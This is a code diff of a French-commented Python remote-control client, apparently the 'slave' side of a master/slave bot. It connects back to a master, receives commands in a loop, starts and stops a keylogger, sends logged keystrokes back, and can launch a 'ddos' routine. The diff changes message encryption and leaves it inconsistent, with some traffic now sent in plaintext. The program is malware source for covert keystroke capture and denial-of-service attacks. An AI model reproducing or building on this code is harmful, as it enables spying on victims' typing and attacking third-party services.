@@ -32,10 +32,9 @@ class Connexion():
         try:
             # on définit les coordonnées sur lesquelles le slave va envoyer son adresse ip
             carte_reseau.connect(("localhost", port))
-            message_connexion = crypto.encrypt("Je me connecte".encode("utf-8"))
-            carte_reseau.send(message_connexion)
+            carte_reseau.send(crypto.encrypt(b"Je me connecte"))
             print("IP envoyée au master")
-            donnee = crypto.decrypt(carte_reseau.recv(1024).decode("utf-8"))
+            donnee = crypto.decrypt(carte_reseau.recv(1024))
             # boucle qui permet de lancer une methode de l'objet communication
             while donnee != "FIN":
                 if donnee == "keylogger":
@@ -52,7 +51,7 @@ class Connexion():
                 elif donnee == "ddos":
                     print("on lance le ddos")
                     objet_action.ddos(carte_reseau, )
-                donnee = crypto.decypt(carte_reseau.recv(1024).decode("utf-8"))
+                donnee = carte_reseau.recv(1024).decode("utf-8")
         except ConnectionRefusedError:
             print("Machine maitre non connecté")
 
@@ -105,7 +104,7 @@ class Action(Connexion):
         else:
             # listener.start va arreter d'écouter en fermant la methode appuie qui est assigné à la varibale listener
             self.listener.stop()
-            carte_reseau.send(crypto.encrypt("Logger arreté".encode("utf-8")))
+            carte_reseau.send(crypto.encrypt(b"Logger arrete"))
             print("logger arreté")
 
     def get_log(self, carte_reseau):
@@ -118,14 +117,14 @@ class Action(Connexion):
         for line in logger.readlines():
             nb_lines += 1
         # on reçoit le nombre de ligne que le maitre veut récuperer
-        lines = crypto.decrypt(carte_reseau.recv(1024).decode("utf-8"))
+        lines = (carte_reseau.recv(1024).decode("utf-8"))
         # start définit à partir de quelle ligne il faut commencer, si on peut les 10 dernières lignes on partira
         # de la dernière ligne - 10, et le -1 est pcq il y a un décalage car on part de 0 et non de 1
         start = nb_lines - 1 - int(lines)
         #on utilise l'opérateur de slicing pour démarrer à la ligne souhaitée
         message_get_log = str(fichier[start:])
 
-        carte_reseau.send(crypto.encrypt(message_get_log.encode("utf-8")))
+        carte_reseau.send(message_get_log.encode("utf-8"))
 
     def ddos(self, carte_reseau):
         # définir le format de la date quand on la rentrera dans la variable
